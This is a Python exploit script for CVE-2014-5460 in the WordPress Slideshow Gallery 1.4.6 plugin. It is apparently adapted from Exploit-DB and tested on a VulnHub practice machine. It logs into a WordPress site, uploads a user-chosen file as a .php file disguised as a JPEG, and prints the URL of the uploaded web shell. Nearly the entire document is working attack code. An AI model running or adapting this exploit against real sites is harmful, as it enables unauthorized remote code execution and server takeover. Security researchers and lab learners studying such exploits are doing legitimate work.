import os
import sys
import requests
# WordPress Slideshow Gallery 1.4.6 Shell Upload Exploit
#
# WordPress Slideshow Gallery plugin version 1.4.6 suffers from a remote shell upload vulnerability (CVE-2014-5460)
# code origin author: https://www.exploit-db.com/exploits/34681
# Vulnerability discovered by: Jesus Ramirez Pichardo - http://whitexploit.blogspot.mx/
import argparse,time
# test machine:
# https://download.vulnhub.com/derpnstink/VulnHub2018_DeRPnStiNK.ova
# ip: 192.168.213.152/weblog/
def exp(url,username,password,file):
    login_url=url+'/wp-login.php'
    plugin_url=url+"/wp-admin/admin.php?page=slideshow-slides&method=save"
    header = {
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0' ,
        'Content-type' : 'application/x-www-form-urlencoded' ,
        'Cookie' : 'wordpress_test_cookie=WP Cookie check'}
    datas = {
        'log' : username ,
        'pwd' : password ,
        'wp-submit' : 'Log' ,
        'testcookie' : '1'
    }
    try :
        response = session.post(login_url,headers=header,data=datas)
        if len( response.headers[ 'Set-Cookie' ].split( " " ) ) < 4 :
            print('[X] Wrong username or password\n')
        else :
            print( '[+] Login Successful!' )
            ##print(header['Cookie'])
        if requests.get(plugin_url,headers=header).status_code==200:
            print( '[+] Plugin Found!' )
            print("[+] It's Vulnerable!")
            para={
                "Slide[id]":'',
                "Slide[order]":'',
                "Slide[title]":'sheep',
                "Slide[description]":'sheep',
                "Slide[showinfo]":'both',
                "Slide[iopacity]":'70',
                "Slide[type]":'file',
                "Slide[image_url]":'',
                "Slide[uselink]":'N',
                "Slide[link]":'',
                "Slide[linktarget]":'self',
            }
            end="---------------------------172410080520015789752211943688"
            body=[]
            file_content=open(file).read()
            header = {
                'Cookie' : '',
                'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0' ,
                'Content-type' : 'multipart/form-data; boundary=---------------------------172410080520015789752211943688' ,
                "Content-length": "0"
                }
            cookies = requests.utils.dict_from_cookiejar( session.cookies )
            for key , value in cookies.items() :
                if key != "wordpress_test_cookie" :
                    header[ 'Cookie' ] += ';' + key + '=' + value
            temp = str( time.time() ).split( '.' )[ 1 ] + ".php"
            for key,value in para.items():
                body.append('--'+end)
                body.append(f'Content-Disposition: form-data; name="{key}"\r\n')
                body.append(value)
            body.append( '--'+end )#每个参数的boundry前面都要多加俩个短线，表示分隔符的开始
            body.append(f'Content-Disposition: form-data; name="image_file"; filename="{temp}"\r\nContent-Type: image/jpeg\r\n' )
            body.append( file_content )
            body.append("-----------------------------172410080520015789752211943688--\r\n")
            # 使用 '\r\n' 作为分隔符连接 body 中的所有元素
            body_str = '\r\n'.join( body )
            header[ "Content-Length" ] = str( len( body_str ) )
            response=requests.post(plugin_url,headers=header,data=body_str)
            #clprint(response.text)
            if "admin.php?page=slideshow-slides&Galleryupdated=true&Gallerymessage=Slide+has+been+saved" in response.text:
                print("[+] Success!")
                print("[+] Uploaded File:"+target_url+'/wp-content/uploads/slideshow-gallery/'+temp)
            else:
                print("[X] Upload Failed!")


    except requests.exceptions.Timeout :
        print( '[X] Connection Timeout\n' )
        sys.exit( 1 )


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='CVE-2014-5460')
    parser.add_argument('-t', '--target',type=str, help='Target URL')
    parser.add_argument('-u', '--user',type=str, help='Username')
    parser.add_argument('-p', '--password',type=str, help='Password')
    parser.add_argument("-f", "--file",type=str, help="File")
    args = parser.parse_args()
    target_url = args.target
    username = args.user
    password = args.password
    file=args.file
    session = requests.Session()
    if not os.path.isfile( file ) and not os.access( file , os.R_OK ) :
        print('[X] ' + file + ' file is missing or not readable')
        sys.exit( 1 )
    exp(target_url,username,password,file)
    session.close()

